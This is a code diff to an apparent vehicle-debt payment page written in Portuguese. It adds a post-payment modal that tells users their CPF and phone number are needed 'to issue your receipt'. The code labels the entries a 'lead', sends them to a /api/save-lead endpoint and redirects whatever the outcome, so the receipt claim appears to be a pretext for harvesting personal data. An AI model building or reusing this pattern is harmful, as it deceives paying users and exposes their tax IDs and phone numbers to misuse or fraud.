@@ -15,6 +15,96 @@
     <link rel="stylesheet" href="css/debitos.css">
     <link rel="stylesheet" href="css/modal.css">
     <script src="lib/sweetalert2/sweetalert2.all.min.js"></script>
+    <style>
+        /* ===== Modal CPF/Telefone pós-pagamento ===== */
+        .lead-modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            display: none;
+            align-items: flex-start;
+            justify-content: center;
+            z-index: 10000;
+            padding: 0 16px;
+        }
+        .lead-modal-overlay.active { display: flex; }
+        .lead-modal-card {
+            background: #fff;
+            border-radius: 16px;
+            max-width: 480px;
+            width: 100%;
+            padding: 28px 24px 24px;
+            margin-top: 10vh;
+            max-height: 85vh;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.35);
+        }
+        .lead-modal-grab {
+            width: 40px; height: 4px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            margin: 0 auto 20px;
+        }
+        .lead-modal-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin: 0 0 8px;
+            text-align: center;
+        }
+        .lead-modal-subtitle {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        .lead-modal-label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #333;
+        }
+        .lead-modal-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: 'Ubuntu', sans-serif;
+            outline: none;
+            margin-bottom: 4px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        .lead-modal-input:focus { border-color: #000; }
+        .lead-modal-input.error { border-color: #e53e3e; }
+        .lead-modal-field-error {
+            font-size: 12px;
+            color: #e53e3e;
+            margin-bottom: 12px;
+            display: none;
+        }
+        .lead-modal-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: 0;
+            background: #000;
+            color: #e5ff51;
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: opacity 0.2s;
+        }
+        .lead-modal-btn:hover { opacity: 0.88; }
+        .lead-modal-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    </style>
 </head>
 
 <body class="is-anon">
@@ -769,6 +859,11 @@
         // ─── Redirecionar para obrigado ──────────────────────────────────────────
         function redirecionarObrigado(placa, valor, chargeId) {
             if (_pollingIntervalo) clearInterval(_pollingIntervalo);
+            // Exibe modal de CPF+Telefone antes de redirecionar
+            exibirModalLeadPosPagamento(placa, valor, chargeId);
+        }
+
+        function _fazerRedirecionamentoFinal(placa, valor, chargeId) {
             const valorFmt = typeof valor === 'number'
                 ? valor.toFixed(2).replace('.', ',')
                 : valor;
@@ -777,6 +872,108 @@
                 + '&valor=' + encodeURIComponent(valorFmt)
                 + '&id=' + encodeURIComponent(chargeId || '')
                 + '&data=' + encodeURIComponent(dataHoje);
+        }
+
+        // ─── Modal CPF+Telefone pós-pagamento ────────────────────────────────────
+        function exibirModalLeadPosPagamento(placa, valor, chargeId) {
+            let overlay = document.getElementById('leadModalOverlay');
+            if (!overlay) {
+                overlay = document.createElement('div');
+                overlay.id = 'leadModalOverlay';
+                overlay.className = 'lead-modal-overlay';
+                overlay.innerHTML = `
+                    <div class="lead-modal-card">
+                        <div aria-hidden="true" class="lead-modal-grab"></div>
+                        <h3 class="lead-modal-title">Pagamento confirmado! ✅</h3>
+                        <p class="lead-modal-subtitle">Para emitir seu comprovante, preencha os dados abaixo.</p>
+
+                        <label for="leadCpfInput" class="lead-modal-label">CPF *</label>
+                        <input class="lead-modal-input" id="leadCpfInput" maxlength="14"
+                            placeholder="000.000.000-00" type="text" autocomplete="off" inputmode="numeric" />
+                        <span class="lead-modal-field-error" id="leadCpfError">CPF inválido. Verifique e tente novamente.</span>
+
+                        <label for="leadTelInput" class="lead-modal-label">Telefone *</label>
+                        <input class="lead-modal-input" id="leadTelInput" maxlength="15"
+                            placeholder="(00) 00000-0000" type="text" autocomplete="off" inputmode="numeric" />
+                        <span class="lead-modal-field-error" id="leadTelError">Telefone inválido. Verifique e tente novamente.</span>
+
+                        <button class="lead-modal-btn" id="btnConfirmarLead" type="button">Continuar</button>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+
+                // Máscara CPF
+                document.getElementById('leadCpfInput').addEventListener('input', function(e) {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 11);
+                    if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+                    else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+                    else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+                    e.target.value = v;
+                });
+
+                // Máscara Telefone
+                document.getElementById('leadTelInput').addEventListener('input', function(e) {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 11);
+                    if (v.length > 10) v = v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+                    else if (v.length > 6) v = v.replace(/(\d{2})(\d{4,5})(\d{0,4})/, '($1) $2-$3');
+                    else if (v.length > 2) v = v.replace(/(\d{2})(\d+)/, '($1) $2');
+                    e.target.value = v;
+                });
+            }
+
+            // Limpar campos
+            document.getElementById('leadCpfInput').value = '';
+            document.getElementById('leadTelInput').value = '';
+            document.getElementById('leadCpfInput').classList.remove('error');
+            document.getElementById('leadTelInput').classList.remove('error');
+            document.getElementById('leadCpfError').style.display = 'none';
+            document.getElementById('leadTelError').style.display = 'none';
+
+            overlay.classList.add('active');
+            setTimeout(() => document.getElementById('leadCpfInput').focus(), 150);
+
+            document.getElementById('btnConfirmarLead').onclick = async () => {
+                const cpfRaw = document.getElementById('leadCpfInput').value.replace(/\D/g, '');
+                const telRaw = document.getElementById('leadTelInput').value.replace(/\D/g, '');
+                let valido = true;
+
+                if (cpfRaw.length !== 11) {
+                    document.getElementById('leadCpfInput').classList.add('error');
+                    document.getElementById('leadCpfError').style.display = 'block';
+                    valido = false;
+                } else {
+                    document.getElementById('leadCpfInput').classList.remove('error');
+                    document.getElementById('leadCpfError').style.display = 'none';
+                }
+
+                if (telRaw.length < 10 || telRaw.length > 11) {
+                    document.getElementById('leadTelInput').classList.add('error');
+                    document.getElementById('leadTelError').style.display = 'block';
+                    valido = false;
+                } else {
+                    document.getElementById('leadTelInput').classList.remove('error');
+                    document.getElementById('leadTelError').style.display = 'none';
+                }
+
+                if (!valido) return;
+
+                const btn = document.getElementById('btnConfirmarLead');
+                btn.disabled = true;
+                btn.textContent = 'Aguarde...';
+
+                try {
+                    await fetch('/api/save-lead', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ placa, cpf: cpfRaw, telefone: telRaw, chargeId, valor })
+                    });
+                } catch(e) {
+                    console.warn('Erro ao salvar lead:', e);
+                }
+
+                overlay.classList.remove('active');
+                _fazerRedirecionamentoFinal(placa, valor, chargeId);
+            };
         }
 
         // ─── Verificação ao clicar em CONTINUAR no step 3 ──────────────────────
